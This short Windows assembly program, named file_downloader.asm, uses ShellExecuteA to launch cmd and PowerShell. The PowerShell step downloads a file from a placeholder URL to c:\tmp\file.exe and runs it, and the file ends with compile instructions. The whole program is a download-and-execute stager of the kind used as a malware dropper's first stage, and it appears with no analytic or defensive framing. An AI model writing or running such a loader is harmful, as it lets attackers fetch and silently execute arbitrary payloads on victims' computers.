EXTERN _SHELLEXECUTEA
GLOBAL _main

SECTION .data
	TP	DB "open", 0
	CMD	DB "cmd", 0
	ARG	DB "/c powershell -Command wget 'URL' -OutFile c:\tmp\file.exe ; c:\tmp\file.exe", 0

SECTION .text
_main:
	PUSH	0
	PUSH	0
	PUSH	ARG
	PUSH	CMD
	PUSH	TP
	PUSH	0
	CALL	_ShellExecuteA

; How to compile:
; nasm -f win32 file_downloader.asm
; golink /entry _main file_downloader.obj Shell32.dll /mix
